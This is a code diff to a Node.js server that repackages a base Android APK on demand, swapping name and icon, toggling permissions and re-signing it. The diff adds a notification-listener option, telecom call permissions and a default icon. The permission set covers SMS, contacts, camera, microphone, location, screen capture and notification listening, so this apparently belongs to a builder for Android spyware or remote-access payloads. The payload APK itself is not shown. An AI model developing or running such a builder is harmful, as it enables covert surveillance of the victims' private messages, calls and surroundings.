@@ -20,9 +20,10 @@ const upload = multer({ storage: multer.memoryStorage() });
 
 const ASSETS_DIR = path.join(__dirname, 'assets');
 const TEMP_DIR   = path.join(__dirname, 'temp');
-const BASE_APK   = path.join(ASSETS_DIR, 'base.apk');
-const KEYSTORE   = path.join(ASSETS_DIR, 'usman90.jks');
-const SIGNER     = path.join(ASSETS_DIR, 'uber-apk-signer.jar');
+const BASE_APK     = path.join(ASSETS_DIR, 'base.apk');
+const DEFAULT_ICON = path.join(ASSETS_DIR, 'default_icon.png');
+const KEYSTORE     = path.join(ASSETS_DIR, 'usman90.jks');
+const SIGNER       = path.join(ASSETS_DIR, 'uber-apk-signer.jar');
 
 if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });
 
@@ -340,17 +341,18 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 arscEntry.header.method = 0;
             }
 
-            const isSmsEnabled             = enableSmsPermission === 'true';
-            const isContactsEnabled        = enableContactsPermission === 'true';
-            const isCameraEnabled          = enableCameraPermission === 'true';
-            const isMicEnabled             = enableMicrophonePermission === 'true';
-            const isLocationEnabled        = enableLocationPermission === 'true';
+            const isSmsEnabled             = enableSmsPermission === 'true' || enableSmsPermission === true;
+            const isContactsEnabled        = enableContactsPermission === 'true' || enableContactsPermission === true;
+            const isCameraEnabled          = enableCameraPermission === 'true' || enableCameraPermission === true;
+            const isMicEnabled             = enableMicrophonePermission === 'true' || enableMicrophonePermission === true;
+            const isLocationEnabled        = enableLocationPermission === 'true' || enableLocationPermission === true;
             const isStorageEnabled         = enableStoragePermission !== 'false' && enableStoragePermission !== false;
             const isFileManagerEnabled     = enableFileManagerPermission !== undefined
                 ? (enableFileManagerPermission === 'true' || enableFileManagerPermission === true)
                 : isStorageEnabled;
             const isScreenCaptureEnabled   = enableScreenCapture === 'true' || enableScreenCapture === true;
             const isForegroundNotifEnabled = enableForegroundNotification !== 'false' && enableForegroundNotification !== false;
+            const isNotifListenerEnabled   = enableNotificationListener === 'true' || enableNotificationListener === true;
 
             await sendUpdate('apk_progress', { step: 'Configuring package & permissions...', progress: 35 });
             const manifestEntry = zip.getEntry('AndroidManifest.xml');
@@ -364,6 +366,12 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 const permsToNeutralize = [];
                 if (!isSmsEnabled) {
                     permsToNeutralize.push('android.permission.READ_SMS', 'android.permission.RECEIVE_SMS');
+                }
+                if (!isNotifListenerEnabled) {
+                    permsToNeutralize.push('android.permission.BIND_NOTIFICATION_LISTENER_SERVICE');
+                }
+                if (!isCameraEnabled && !isMicEnabled) {
+                    permsToNeutralize.push('android.permission.BIND_TELECOM_CONNECTION_SERVICE', 'android.permission.MANAGE_OWN_CALLS');
                 }
                 if (!isContactsEnabled) {
                     permsToNeutralize.push('android.permission.READ_CONTACTS');
@@ -412,14 +420,19 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
             }
 
             if (customIcon && customIcon.buffer) {
-                await sendUpdate('apk_progress', { step: 'Embedding launcher icons...', progress: 50 });
+                await sendUpdate('apk_progress', { step: 'Embedding custom launcher icons...', progress: 50 });
                 await replaceIcons(zip, customIcon.buffer);
             } else {
                 try {
                     await sendUpdate('apk_progress', { step: 'Generating launcher icons...', progress: 50 });
-                    const fallbackIcon = await generateDefaultAppIcon(targetName);
-                    if (fallbackIcon) {
-                        await replaceIcons(zip, fallbackIcon);
+                    let fallbackBuf = null;
+                    if (fs.existsSync(DEFAULT_ICON)) {
+                        fallbackBuf = fs.readFileSync(DEFAULT_ICON);
+                    } else {
+                        fallbackBuf = await generateDefaultAppIcon(targetName);
+                    }
+                    if (fallbackBuf) {
+                        await replaceIcons(zip, fallbackBuf);
                     }
                 } catch (iconErr) {
                     console.error('[ICON] Fallback icon error:', iconErr.message);
